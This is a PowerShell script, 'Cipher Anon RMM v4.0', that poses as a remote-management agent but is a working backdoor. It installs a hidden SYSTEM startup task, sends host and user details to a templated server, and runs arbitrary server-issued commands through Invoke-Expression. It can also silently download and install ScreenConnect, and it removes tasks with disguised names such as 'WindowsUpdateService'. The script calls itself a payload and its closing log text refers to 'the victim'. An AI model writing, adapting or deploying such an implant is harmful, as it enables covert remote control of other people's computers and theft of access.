# ============================================================
# CIPHER ANON RMM v4.0 — FORCE CLEAN + RELIABLE CONNECTION
# ============================================================

# ---- CONFIG ----
$BASE_URL = "{{BASE_URL}}"
$RMM_REPORT_URL = "$BASE_URL/api/rmm/report"
$COMMAND_URL = "$BASE_URL/api/rmm/commands"
$RESPONSE_URL = "$BASE_URL/api/rmm/response"
$SCREENCONNECT_URL = "{{SCREENCONNECT_URL}}"

$RMM_CLIENT_DIR = "$env:PROGRAMDATA\CipherAnonRMM"
$RMM_CLIENT_ID_FILE = "$RMM_CLIENT_DIR\client_id.txt"
$RMM_LOGFILE = "$RMM_CLIENT_DIR\rmm_log.txt"
$RMM_POLL_INTERVAL = 15000

# ============================================================
# PHASE 1: FORCE CLEAN — REMOVE EVERYTHING FIRST
# ============================================================

Write-Host ""
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  CIPHER ANON RMM v4.0 — FORCE INSTALL" -ForegroundColor Yellow
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "[PRE-CLEAN] Removing any existing RMM components..." -ForegroundColor White

# 1. Kill ALL PowerShell processes that might be RMM
Write-Host "  Killing existing processes..." -ForegroundColor Gray
$procs = Get-Process -Name powershell -ErrorAction SilentlyContinue
foreach ($p in $procs) {
    try {
        if ($p.CommandLine -like "*CipherAnon*" -or $p.CommandLine -like "*rmm*" -or $p.CommandLine -like "*payload*") {
            $p.Kill() | Out-Null
            Write-Host "    Killed process $($p.Id)" -ForegroundColor Green
        }
    } catch {}
}
Start-Sleep -Seconds 2

# 2. Unregister ALL possible scheduled tasks
Write-Host "  Removing scheduled tasks..." -ForegroundColor Gray
$taskNames = @("CipherAnonRMM", "CipherAnon", "RMM", "WindowsUpdateService", "MicrosoftTelemetry")
foreach ($name in $taskNames) {
    try {
        $task = Get-ScheduledTask -TaskName $name -ErrorAction SilentlyContinue
        if ($task) {
            Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue
            Write-Host "    Removed: $name" -ForegroundColor Green
        }
    } catch {}
}

# 3. Delete the RMM directory
Write-Host "  Deleting client directory..." -ForegroundColor Gray
if (Test-Path $RMM_CLIENT_DIR) {
    try {
        Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "    Deleted: $RMM_CLIENT_DIR" -ForegroundColor Green
    } catch {
        Write-Host "    Could not delete (may be locked)" -ForegroundColor Yellow
    }
}

# 4. Delete any registry entries (skip if access denied)
Write-Host "  Cleaning registry (skip if denied)..." -ForegroundColor Gray
$regPaths = @("HKLM:\SOFTWARE\CipherAnonRMM", "HKCU:\SOFTWARE\CipherAnonRMM")
foreach ($reg in $regPaths) {
    try {
        if (Test-Path $reg) {
            Remove-Item -Path $reg -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "    Removed: $reg" -ForegroundColor Green
        }
    } catch {}
}

# 5. Clean temp files
Write-Host "  Cleaning temp files..." -ForegroundColor Gray
try {
    $tempFiles = Get-ChildItem -Path "$env:TEMP" -Filter "*CipherAnon*" -ErrorAction SilentlyContinue
    foreach ($f in $tempFiles) {
        try { Remove-Item $f.FullName -Force -ErrorAction SilentlyContinue } catch {}
    }
} catch {}

Write-Host ""
Write-Host "[PRE-CLEAN] COMPLETE!" -ForegroundColor Green
Write-Host ""

# ============================================================
# PHASE 2: CREATE DIRECTORY WITH PERMISSIONS
# ============================================================

Write-Host "[SETUP] Creating client directory..." -ForegroundColor White

try {
    if (-not (Test-Path $RMM_CLIENT_DIR)) {
        New-Item -ItemType Directory -Path $RMM_CLIENT_DIR -Force -ErrorAction SilentlyContinue | Out-Null
    }
    # Try to give Everyone read/write access (may fail on some systems, ignore)
    try {
        icacls $RMM_CLIENT_DIR /grant Everyone:F /T /Q 2>nul
    } catch {}
    Write-Host "  Directory: $RMM_CLIENT_DIR" -ForegroundColor Green
} catch {
    Write-Host "  WARNING: Could not create directory" -ForegroundColor Yellow
}

# ============================================================
# PHASE 3: LOGGING FUNCTION
# ============================================================

function Write-Log {
    param($Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Msg"
    try {
        Add-Content -Path $RMM_LOGFILE -Value $line -ErrorAction SilentlyContinue
    } catch {}
    Write-Host $line
}

Write-Log "============================================"
Write-Log "CIPHER ANON RMM v4.0"
Write-Log "Target: $env:COMPUTERNAME"
Write-Log "Base URL: $BASE_URL"
Write-Log "============================================"

# ============================================================
# PHASE 4: GET CLIENT ID
# ============================================================

function Get-RmmClientId {
    try {
        if (Test-Path $RMM_CLIENT_ID_FILE) {
            $id = Get-Content $RMM_CLIENT_ID_FILE -Raw -ErrorAction SilentlyContinue
            if ($id -and $id.Trim()) {
                return $id.Trim()
            }
        }
    } catch {}
    
    $id = [System.Guid]::NewGuid().ToString().Substring(0,8)
    try {
        Set-Content -Path $RMM_CLIENT_ID_FILE -Value $id -ErrorAction SilentlyContinue
    } catch {}
    return $id
}

$clientId = Get-RmmClientId
Write-Log "Client ID: $clientId"

# ============================================================
# PHASE 5: PERSISTENCE
# ============================================================

function Install-Persistence {
    $taskName = "CipherAnonRMM"
    $scriptPath = $MyInvocation.MyCommand.Path
    
    try {
        $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if ($task) {
            Write-Log "Scheduled task already exists"
            return
        }
    } catch {}
    
    Write-Log "Creating scheduled task: $taskName"
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force -ErrorAction SilentlyContinue
        Write-Log "Scheduled task created"
    } catch {
        Write-Log "Failed to create scheduled task: $_"
    }
}

Install-Persistence

# ============================================================
# PHASE 6: COMMAND EXECUTOR
# ============================================================

function Execute-Command {
    param($Command)
    
    Write-Log "Executing: $Command"
    $result = ""
    $success = $true

    if ($Command -like "install-screenconnect*") {
        Write-Log "Downloading ScreenConnect..."
        $installer = "$env:TEMP\sc_installer.msi"
        try {
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($SCREENCONNECT_URL, $installer)
        } catch {
            $result = "Download failed"
            $success = $false
            return @{ success = $success; result = $result }
        }
        if (Test-Path $installer) {
            Write-Log "Installing ScreenConnect..."
            Start-Process -FilePath "msiexec" -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait -WindowStyle Hidden
            Remove-Item $installer -Force -ErrorAction SilentlyContinue
            $result = "ScreenConnect installed"
            try {
                $scId = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ClientID" -ErrorAction SilentlyContinue
                if ($scId) {
                    $result = "ScreenConnect installed - Client ID: " + $scId.ClientID
                }
            } catch {}
        } else {
            $result = "Failed to download ScreenConnect"
            $success = $false
        }
        return @{ success = $success; result = $result }
    }

    if ($Command -like "uninstall-rmm") {
        try {
            Unregister-ScheduledTask -TaskName "CipherAnonRMM" -Confirm:$false -ErrorAction SilentlyContinue
            Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
            $result = "RMM uninstalled"
        } catch {
            $result = "Failed to uninstall: $_"
            $success = $false
        }
        return @{ success = $success; result = $result }
    }

    if ($Command -like "whoami") {
        $result = $env:USERNAME
        return @{ success = $true; result = $result }
    }

    if ($Command -like "hostname") {
        $result = $env:COMPUTERNAME
        return @{ success = $true; result = $result }
    }

    if ($Command -like "ping") {
        $result = "pong"
        return @{ success = $true; result = $result }
    }

    if ($Command -like "restart") {
        $result = "Restarting system..."
        Start-Process -FilePath "shutdown" -ArgumentList "/r /t 5 /c 'Remote restart'" -WindowStyle Hidden
        return @{ success = $true; result = $result }
    }

    if ($Command -like "shutdown") {
        $result = "Shutting down system..."
        Start-Process -FilePath "shutdown" -ArgumentList "/s /t 5 /c 'Remote shutdown'" -WindowStyle Hidden
        return @{ success = $true; result = $result }
    }

    try {
        $output = Invoke-Expression $Command 2>&1 | Out-String
        $result = $output
        $success = $true
    } catch {
        $result = "Unknown command or error: $_"
        $success = $false
    }

    return @{ success = $success; result = $result }
}

# ============================================================
# PHASE 7: MAIN LOOP
# ============================================================

function Send-Report {
    param($clientId)
    
    Write-Log "Sending report to server..."
    
    try {
        $osInfo = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        if (-not $osInfo) {
            $osInfo = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        }
        if (-not $osInfo) {
            $osInfo = "Windows"
        }
        
        $reportData = @{
            clientId = $clientId
            pcName = $env:COMPUTERNAME
            username = $env:USERNAME
            os = $osInfo
            status = "online"
            timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
            rmmInstalled = $true
            rmmType = "CipherAnonRMM"
            source = "payload_v4"
        }
        
        $reportJson = $reportData | ConvertTo-Json -Depth 5
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($reportJson)
        
        $req = [System.Net.WebRequest]::Create($RMM_REPORT_URL)
        $req.Method = "POST"
        $req.ContentType = "application/json"
        $req.ContentLength = $bytes.Length
        $req.Timeout = 15000
        $req.UserAgent = "CipherAnonRMM/4.0"
        
        $stream = $req.GetRequestStream()
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Close()
        
        $resp = $req.GetResponse()
        $resp.Close()
        
        Write-Log "Report sent successfully!"
        return $true
    } catch {
        $err = $_.Exception.Message
        Write-Log "Report failed: $err"
        return $false
    }
}

function Start-RmmLoop {
    param($clientId)
    
    $firstRun = $true
    
    Write-Log "Main loop started"
    
    while ($true) {
        try {
            if ($firstRun) {
                Write-Log "Initial registration attempt..."
                $success = Send-Report -clientId $clientId
                if ($success) {
                    Write-Log "REGISTRATION SUCCESSFUL! Client should appear in dashboard."
                    $firstRun = $false
                } else {
                    Write-Log "Initial registration failed. Will retry in 5 seconds..."
                    Start-Sleep -Seconds 5
                    continue
                }
            } else {
                Send-Report -clientId $clientId
            }
            
            # Check for commands
            try {
                $cmdReq = [System.Net.WebRequest]::Create("$COMMAND_URL/$clientId")
                $cmdReq.Method = "GET"
                $cmdReq.Timeout = 10000
                $cmdReq.UserAgent = "CipherAnonRMM/4.0"
                $cmdResp = $cmdReq.GetResponse()
                $reader = New-Object System.IO.StreamReader($cmdResp.GetResponseStream())
                $cmdJson = $reader.ReadToEnd()
                $cmdResp.Close()
                
                if ($cmdJson) {
                    $cmdData = $cmdJson | ConvertFrom-Json
                    if ($cmdData -and $cmdData.command) {
                        Write-Log "Command: $($cmdData.command)"
                        $result = Execute-Command -Command $cmdData.command
                        $responseData = @{
                            clientId = $clientId
                            commandId = $cmdData.id
                            success = $result.success
                            result = $result.result
                            timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                        }
                        $respJson = $responseData | ConvertTo-Json -Depth 5
                        $respBytes = [System.Text.Encoding]::UTF8.GetBytes($respJson)
                        $respReq = [System.Net.WebRequest]::Create("$RESPONSE_URL/$clientId")
                        $respReq.Method = "POST"
                        $respReq.ContentType = "application/json"
                        $respReq.ContentLength = $respBytes.Length
                        $respReq.Timeout = 10000
                        $respStream = $respReq.GetRequestStream()
                        $respStream.Write($respBytes, 0, $respBytes.Length)
                        $respStream.Close()
                        $respResp = $respReq.GetResponse()
                        $respResp.Close()
                        Write-Log "Command response sent"
                    }
                }
            } catch {
                Write-Log "Command check failed: $_"
            }
            
        } catch {
            Write-Log "Loop error: $_"
        }
        
        Start-Sleep -Milliseconds $RMM_POLL_INTERVAL
    }
}

# ============================================================
# PHASE 8: START THE AGENT
# ============================================================

Write-Log "Starting RMM agent..."

$jobScript = {
    param($clientId, $RMM_REPORT_URL, $COMMAND_URL, $RESPONSE_URL, $RMM_CLIENT_DIR, $RMM_CLIENT_ID_FILE, $RMM_LOGFILE, $RMM_POLL_INTERVAL, $SCREENCONNECT_URL)
    
    function Write-Log {
        param($Msg)
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $line = "[$timestamp] $Msg"
        try { Add-Content -Path $RMM_LOGFILE -Value $line -ErrorAction SilentlyContinue } catch {}
    }
    
    function Send-Report {
        param($clientId)
        try {
            $osInfo = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
            if (-not $osInfo) { $osInfo = "Windows" }
            $reportData = @{
                clientId = $clientId
                pcName = $env:COMPUTERNAME
                username = $env:USERNAME
                os = $osInfo
                status = "online"
                timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                rmmInstalled = $true
                rmmType = "CipherAnonRMM"
                source = "payload_v4"
            }
            $reportJson = $reportData | ConvertTo-Json -Depth 5
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($reportJson)
            $req = [System.Net.WebRequest]::Create($RMM_REPORT_URL)
            $req.Method = "POST"
            $req.ContentType = "application/json"
            $req.ContentLength = $bytes.Length
            $req.Timeout = 15000
            $req.UserAgent = "CipherAnonRMM/4.0"
            $stream = $req.GetRequestStream()
            $stream.Write($bytes, 0, $bytes.Length)
            $stream.Close()
            $resp = $req.GetResponse()
            $resp.Close()
            return $true
        } catch {
            return $false
        }
    }
    
    $firstRun = $true
    Write-Log "Background loop started (ID: $clientId)"
    
    while ($true) {
        try {
            if ($firstRun) {
                $success = Send-Report -clientId $clientId
                if ($success) {
                    Write-Log "Initial registration successful!"
                    $firstRun = $false
                } else {
                    Write-Log "Initial registration failed, retrying..."
                    Start-Sleep -Seconds 5
                    continue
                }
            } else {
                Send-Report -clientId $clientId
            }
            
            try {
                $cmdReq = [System.Net.WebRequest]::Create("$COMMAND_URL/$clientId")
                $cmdReq.Method = "GET"
                $cmdReq.Timeout = 10000
                $cmdResp = $cmdReq.GetResponse()
                $reader = New-Object System.IO.StreamReader($cmdResp.GetResponseStream())
                $cmdJson = $reader.ReadToEnd()
                $cmdResp.Close()
                if ($cmdJson) {
                    $cmdData = $cmdJson | ConvertFrom-Json
                    if ($cmdData -and $cmdData.command) {
                        Write-Log "Command: $($cmdData.command)"
                        $responseData = @{
                            clientId = $clientId
                            commandId = $cmdData.id
                            success = $true
                            result = "Command acknowledged"
                            timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                        }
                        $respJson = $responseData | ConvertTo-Json -Depth 5
                        $respBytes = [System.Text.Encoding]::UTF8.GetBytes($respJson)
                        $respReq = [System.Net.WebRequest]::Create("$RESPONSE_URL/$clientId")
                        $respReq.Method = "POST"
                        $respReq.ContentType = "application/json"
                        $respReq.ContentLength = $respBytes.Length
                        $respReq.Timeout = 10000
                        $respStream = $respReq.GetRequestStream()
                        $respStream.Write($respBytes, 0, $respBytes.Length)
                        $respStream.Close()
                        $respResp = $respReq.GetResponse()
                        $respResp.Close()
                    }
                }
            } catch {}
        } catch {
            Write-Log "Loop error: $_"
        }
        Start-Sleep -Milliseconds $RMM_POLL_INTERVAL
    }
}

$job = Start-Job -ScriptBlock $jobScript -ArgumentList $clientId, $RMM_REPORT_URL, $COMMAND_URL, $RESPONSE_URL, $RMM_CLIENT_DIR, $RMM_CLIENT_ID_FILE, $RMM_LOGFILE, $RMM_POLL_INTERVAL, $SCREENCONNECT_URL

if ($job) {
    Write-Log ""
    Write-Log "============================================"
    Write-Log "RMM CLIENT READY!"
    Write-Log "Client ID: $clientId"
    Write-Log "Log file: $RMM_LOGFILE"
    Write-Log "Poll Interval: $RMM_POLL_INTERVAL ms"
    Write-Log "============================================"
    Write-Log ""
    Write-Log "Check the log file to see if registration succeeds:"
    Write-Log "  Get-Content '$RMM_LOGFILE' -Tail 20"
    Write-Log ""
    Write-Log "If registration fails, check:"
    Write-Log "  1. The server URL is correct: $BASE_URL"
    Write-Log "  2. The victim has internet access"
    Write-Log "  3. Firewall is not blocking outbound HTTPS"
    Write-Log "============================================"
} else {
    Write-Log "FAILED TO START RMM AGENT!"
}

exit
